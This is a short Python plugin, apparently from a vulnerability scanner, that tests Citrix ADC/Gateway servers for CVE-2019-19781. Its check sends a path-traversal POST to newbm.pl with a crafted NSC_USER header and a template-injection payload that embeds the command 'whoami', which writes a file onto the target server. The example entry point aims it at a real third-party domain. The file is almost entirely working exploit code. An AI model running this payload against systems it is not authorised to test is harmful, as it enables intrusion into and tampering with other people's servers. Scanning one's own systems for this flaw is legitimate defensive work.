#!/usr/bin/env python3

import uuid
from app.lib.common import get_useragent
from app.lib.request import request

class CVE_2019_19781_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2019-19781漏洞',
            'description': 'Citrix ADC Remote Code Execution Vulnerability, Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0',
            'date': '2019-12-16',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.cdl = str(uuid.uuid4()).split('-')[0]
        self.payload = ''

    async def check(self):

        """
        检测是否存在漏洞

        :param:
        :return bool True or False: 是否存在漏洞
        """

        try:
            self.payload = "url=http://example.com&title=" + self.cdl + "&desc=[% template.new('BLOCK' = 'print `"+ 'whoami' + "`') %]"
            newbm_url = self.url + '/vpn/../vpns/portal/scripts/newbm.pl'
            headers = {
                'User-Agent': get_useragent(),
                'Connection': 'close',
                'NSC_USER': '../../../netscaler/portal/templates/%s' %self.cdl,
                'NSC_NONCE': 'nsroot'
            }
            req = await request.post(url = newbm_url, headers = headers, data = self.payload)
            if req.status == 200 and 'parent.window.ns_reload' in req.content:
                return True
            
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    CVE_2019_19781 = CVE_2019_19781_BaseVerify('http://baidu.com')
    print(CVE_2019_19781.check())
